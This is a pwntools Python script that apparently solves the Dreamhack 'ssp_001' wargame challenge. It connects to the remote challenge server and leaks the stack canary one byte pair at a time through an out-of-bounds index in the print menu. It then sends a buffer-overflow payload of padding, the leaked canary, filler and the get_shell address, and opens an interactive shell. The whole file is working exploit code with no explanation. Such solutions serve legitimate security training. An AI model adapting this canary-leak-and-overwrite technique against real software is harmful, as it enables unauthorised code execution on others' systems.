from pwn import *

def slog(name, addr):
  return success(": ".join([name, hex(addr)]))

p = remote("host3.dreamhack.games", 11464)

e = ELF('./ssp_001')

getShell = e.symbols['get_shell']

canary = b''

num = 131

while num >= 128:
  p.sendlineafter(b'> ', b'P')
  p.sendlineafter(b'index : ', str(num))
  p.recvuntil(b'is : ')
  canary += p.recvn(2)
  num = num - 1

canary = int(canary, 16)
slog('Canary : ', canary)

payload = b'A' * 64
payload += p32(canary)
payload += b'B' * 8
payload += p32(getShell)

p.sendlineafter(b'> ', b'E')
p.sendlineafter(b'Name Size : ', bytes(str(len(payload)), 'utf-8'))
p.sendlineafter(b'Name : ', payload)

p.interactive()